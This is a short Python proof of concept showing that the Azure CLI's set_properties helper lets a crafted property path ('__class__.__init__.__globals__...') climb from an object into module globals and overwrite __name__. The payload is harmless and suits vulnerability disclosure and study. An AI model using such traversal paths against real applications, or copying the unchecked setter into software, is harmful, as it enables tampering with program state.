from azure.cli.core.commands.arm import _find_property, set_properties
from dataclasses import dataclass

@dataclass
class State:
    input: str
    output: str
    textarea_key: int

obj = State('HELLO', 'WORLD', 0)

set_properties(obj, "__class__.__init__.__globals__.__name__=polluted", 'modified')
print(__name__)